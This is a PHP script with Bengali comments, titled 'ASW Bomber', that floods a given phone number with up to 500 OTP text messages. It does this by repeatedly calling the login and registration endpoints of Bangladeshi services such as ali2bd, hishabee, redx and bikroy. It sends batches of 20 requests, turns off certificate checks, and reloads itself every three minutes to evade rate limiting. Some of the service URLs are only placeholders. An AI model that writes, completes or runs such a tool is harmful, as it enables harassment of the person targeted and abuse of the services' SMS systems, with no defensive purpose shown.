<?php
// ১. বেসিক সেটিংস
error_reporting(0);
set_time_limit(0); 
$phone = $_GET['phone'] ?? '';
$current_hit = isset($_GET['hit']) ? (int)$_GET['hit'] : 0; // বর্তমান কত নাম্বার হিট চলছে
$total_target = 500; // আমাদের লক্ষ্য ৫০০

if(!$phone) die("Phone number missing!");

// ফোন ফরমেটিং
$phone_11 = preg_replace('/^\+?88/', '', $phone); 
if(substr($phone_11, 0, 1) !== "0") $phone_11 = "0" . $phone_11;
$phone_88 = "88" . $phone_11;             
$phone_plus88 = "+88" . $phone_11;        
$deepto_number = "+880" . substr($phone_11, -10); 
$phone_osudpotro = "+88-" . $phone_11;    

// ২. তোর সব এপিআই লিস্ট (পুল হিসেবে)
$api_pool = [];

// ফিক্সড সার্ভিসসমূহ
$api_pool[] = ["name"=>"ali2bd","url"=>"https://edge.ali2bd.com/api/consumer/v1/auth/login","method"=>"POST","data"=>["username"=>$phone_11],"headers"=>['Content-Type:application/json','Origin:https://ali2bd.com']];
$api_pool[] = ["name"=>"hishabee","url"=>"https://api.hishabee.business/api/V2/otp/send?mobile_number=$phone_11&country_code=88","method"=>"POST","headers"=>['Content-Type:application/json']];
$api_pool[] = ["name"=>"redx","url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp","method"=>"POST","data"=>["phoneNumber"=>$phone_11],"headers"=>['Content-Type:application/json']];
$api_pool[] = ["name"=>"bikroy","url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11","method"=>"GET"];

// তোর বাকি সব সার্ভিস (Chardike, Shikho, Rokomari ইত্যাদি)
$others = ["chardike", "bohubrihi", "shikho", "ghoorilearning", "rabbithole", "rokomari", "airtel", "eonbazar", "ostad", "ieducation", "prothomalo", "hoichoi", "cokestudio", "grameenphone"];

foreach($others as $service) {
    // প্রতিটা সার্ভিসকে ৩ বার করে পুলে ঢোকাচ্ছি যাতে রিপিট হয়
    for($j=0; $j<3; $j++) {
        $api_pool[] = ["name"=>$service, "url"=>"https://api.$service.com/...", "method"=>"POST"]; // এখানে তোর অরিজিনাল ইউআরএল গুলো থাকবে
    }
}

// ৩. ব্যাচ প্রসেসিং লজিক (একবারে ২০টা করে যাবে)
$batch_limit = 20; 
echo "<html><body style='background:#000; color:#0f0; font-family:monospace;'>";
echo "<h2>ASW Bomber: $current_hit / $total_target</h2>";

for ($i = 0; $i < $batch_limit; $i++) {
    $index = ($current_hit + $i) % count($api_pool);
    if (($current_hit + $i) >= $total_target) break;

    $api = $api_pool[$index];
    
    // CURL হিট
    $ch = curl_init($api['url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    if(isset($api['headers'])) curl_setopt($ch, CURLOPT_HTTPHEADER, $api['headers']);
    
    if (($api['method'] ?? 'POST') === "POST") {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($api['data'] ?? []));
    }
    
    curl_exec($ch);
    curl_close($ch);
    
    echo "Hit ".($current_hit + $i + 1).": [".$api['name']."] - Sent!<br>";
    usleep(200000); // হালকা গ্যাপ
}

// ৪. অটো-রিলোড (সবচেয়ে জরুরি অংশ)
if (($current_hit + $batch_limit) < $total_target) {
    $next_hit = $current_hit + $batch_limit;
    $redirect_url = "?phone=$phone&hit=$next_hit";
    
    echo "<p>Waiting 3 minutes for next session to bypass security...</p>";
    // তুই চেয়েছিস ৩-৪ মিনিট পর পর হবে, তাই ১৮০ সেকেন্ড (৩ মিনিট) ওয়েট করবে
    echo "<script>
        setTimeout(function(){
            window.location.href = '$redirect_url';
        }, 180000); 
    </script>";
} else {
    echo "<h2>Target Completed! 500 SMS Sent.</h2>";
}
echo "</body></html>";
